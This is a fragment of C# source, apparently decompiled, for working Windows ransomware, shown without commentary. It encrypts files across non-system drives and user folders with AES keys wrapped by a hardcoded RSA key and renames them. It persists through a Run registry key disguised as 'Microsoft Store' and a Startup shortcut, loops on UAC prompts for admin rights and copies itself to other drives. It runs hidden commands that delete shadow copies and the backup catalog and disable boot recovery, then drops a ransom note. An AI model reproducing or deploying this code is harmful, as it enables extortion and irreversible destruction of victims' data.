		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>0xj0/IxaFVusp2eOLa1nv5YM58WAVD875XTCpiVzIWMHT/2cUmHLYxhm445mM65sIiQI7TpQ9yga3IOSY0+OOI+VhFXuaUTEwREdyg/+QIAqp3VRNq+izolHasmR1tv4SQmvXRQQ8qJMGZcnX4THZJpXf8n2x1IzN4znt/hAL2k=</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static void EncryptFile(string file)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		string text = CreatePassword(20);
		byte[] bytes = Encoding.UTF8.GetBytes(text);
		byte[] inArray = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllText(file, "<EncryptedKey>" + RSAEncrypt(text, rsaKey()) + "<EncryptedKey>" + Convert.ToBase64String(inArray));
		File.Move(file, file + "." + RandomStringForExtension(4));
	}

	public static string RSAEncrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(1024);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\")
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
		string location = userDir + userName + "\\Desktop";
		string location2 = userDir + userName + "\\Links";
		string location3 = userDir + userName + "\\Contacts";
		string location4 = userDir + userName + "\\Desktop";
		string location5 = userDir + userName + "\\Documents";
		string location6 = userDir + userName + "\\Downloads";
		string location7 = userDir + userName + "\\Pictures";
		string location8 = userDir + userName + "\\Music";
		string location9 = userDir + userName + "\\OneDrive";
		string location10 = userDir + userName + "\\Saved Games";
		string location11 = userDir + userName + "\\Favorites";
		string location12 = userDir + userName + "\\Searches";
		string location13 = userDir + userName + "\\Videos";
		encryptDirectory(location);
		encryptDirectory(location2);
		encryptDirectory(location3);
		encryptDirectory(location4);
		encryptDirectory(location5);
		encryptDirectory(location6);
		encryptDirectory(location7);
		encryptDirectory(location8);
		encryptDirectory(location9);
		encryptDirectory(location10);
		encryptDirectory(location11);
		encryptDirectory(location12);
		encryptDirectory(location13);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			File.WriteAllLines(text, messages);
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\" && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
